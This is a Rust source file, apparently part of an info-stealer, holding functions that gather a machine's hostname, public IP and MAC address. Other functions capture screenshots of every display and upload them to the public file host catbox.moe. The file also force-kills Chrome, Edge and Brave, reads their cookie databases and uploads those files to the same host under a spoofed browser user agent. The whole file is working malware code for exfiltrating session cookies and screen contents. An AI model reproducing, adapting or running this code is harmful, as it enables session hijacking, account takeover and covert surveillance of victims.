use mac_address::get_mac_address;
use reqwest::multipart;
use screenshots::Screen;
use std::ffi::OsString;
use std::fs;
use std::io::Cursor;
use std::path::PathBuf;

use crate::utils::process::find_and_kill_process;

pub fn get_host() -> OsString {
    return gethostname::gethostname();
}

pub async fn get_ip() -> Result<String, Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();

    let resp = client.get("https://api.ipify.org").send().await?;
    let text = resp.text().await?;
    Ok(text.trim().to_string())
}

pub fn get_mac() -> String {
    if let Ok(Some(mac)) = get_mac_address() {
        let mac_string: String = mac.to_string();
        return mac_string;
    } else {
        return "Failed to get MAC address".to_string();
    }
}

pub async fn screenshot_desktop_and_upload() -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let screens = Screen::all()?;

    let client = reqwest::Client::builder()
        .http1_only()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .build()?;

    let mut urls = Vec::new();

    for screen in screens {
        let image = screen.capture()?;
        let mut png_bytes: Vec<u8> = Vec::new();

        image.write_to(
            &mut Cursor::new(&mut png_bytes),
            screenshots::image::ImageFormat::Png,
        )?;

        if png_bytes.is_empty() {
            continue;
        }

        let form = multipart::Form::new().text("reqtype", "fileupload").part(
            "fileToUpload",
            multipart::Part::bytes(png_bytes)
                .file_name("screenshot.png")
                .mime_str("image/png")?,
        );

        let resp = client
            .post("https://catbox.moe/user/api.php")
            .multipart(form)
            .send()
            .await?;

        let status = resp.status();
        let text = resp.text().await?;

        if status.is_success() && !text.is_empty() {
            urls.push(text.trim().to_string());
        } else {
            return Err(format!("Upload failed: {} - {}", status, text).into());
        }
    }

    Ok(urls)
}

pub async fn grab_cookies() -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let mut urls = Vec::new();

    let chrome: PathBuf = "Google/Chrome/User Data/Default/Network/Cookies".into();
    let edge: PathBuf = "Microsoft/Edge/User Data/Default/Network/Cookies".into();
    let brave: PathBuf = "BraveSoftware/Brave-Browser/User Data/Default/Network/Cookies".into();

    let mut full_paths: Vec<PathBuf> = Vec::new();

    if let Some(base) = dirs::data_local_dir() {
        let p = vec![chrome, edge, brave];

        for path in p {
            full_paths.push(base.join(path));
        }
    }

    let processes = vec!["chrome.exe", "msedge.exe", "brave.exe"];

    for p in processes {
        find_and_kill_process(p);
    }

    let client = reqwest::Client::builder()
        .http1_only()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .build()?;

    for path in &full_paths {
        if path.exists() {
            println!("{:?} exists", path);

            let cookies = path.file_name().unwrap().to_string_lossy();

            let file_bytes = fs::read(&path)?;

            let form = multipart::Form::new().text("reqtype", "fileupload").part(
                "fileToUpload",
                multipart::Part::bytes(file_bytes)
                    .file_name(cookies.to_string())
                    .mime_str("application/octet-stream")?,
            );

            let resp = client
                .post("https://catbox.moe/user/api.php")
                .multipart(form)
                .send()
                .await?;

            let status = resp.status();
            let text = resp.text().await?;

            if status.is_success() && !text.is_empty() {
                urls.push(text.trim().to_string());
            } else {
                return Err(format!("Upload failed: {} - {}", status, text).into());
            }
        } else {
            continue;
        }
    }

    Ok(urls)
}
